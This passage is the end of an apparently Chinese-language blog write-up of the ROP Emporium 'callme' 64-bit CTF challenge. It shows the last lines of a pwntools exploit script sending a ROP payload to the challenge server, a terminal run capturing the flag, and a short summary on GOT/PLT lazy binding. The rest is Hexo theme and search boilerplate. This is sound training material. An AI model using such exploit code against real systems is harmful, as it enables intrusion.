remote(&apos;172.106.194.121&apos;,9999)#连接远程端口，按照题目给的</span><br><span class="line">io.sendline(payload)</span><br><span class="line">print io.recvall()</span><br></pre></td></tr></table></figure>
+<p>运行：<br>​    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mask@mask-virtual-machine:~/x64Pwn/callme$ vim exp.py </span><br><span class="line">mask@mask-virtual-machine:~/x64Pwn/callme$ python exp.py </span><br><span class="line">[+] Opening connection to 172.106.194.121 on port 9999: Done</span><br><span class="line">[+] Receiving all data: Done (99B)</span><br><span class="line">[*] Closed connection to 172.106.194.121 port 9999</span><br><span class="line">callme by ROP Emporium</span><br><span class="line">64bits</span><br><span class="line"></span><br><span class="line">Hope you read the instructions...</span><br><span class="line">&gt; flag-&#123;Do_more_and_ask_less&#125;-flag</span><br><span class="line">mask@mask-virtual-machine:~/x64Pwn/callme$</span><br></pre></td></tr></table></figure>
+<p>成功！</p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>学习了构造函数传参的payload以及GOT和.plt等延迟绑定技术</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/17/2013plaidctf-ropasaurusrex/" rel="next" title="2013plaidctf-ropasaurusrex">
+                <i class="fa fa-chevron-left"></i> 2013plaidctf-ropasaurusrex
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/17/Defcon2015R0pbaby/" rel="prev" title="Defcon2015R0pbaby">
+                Defcon2015R0pbaby <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Mask</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-源码分析"><span class="nav-number">1.</span> <span class="nav-text">0x00 源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-程序调试"><span class="nav-number">2.</span> <span class="nav-text">0x01 程序调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-exp的编写"><span class="nav-number">3.</span> <span class="nav-text">0x02 exp的编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-总结"><span class="nav-number">4.</span> <span class="nav-text">0x03 总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mask</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
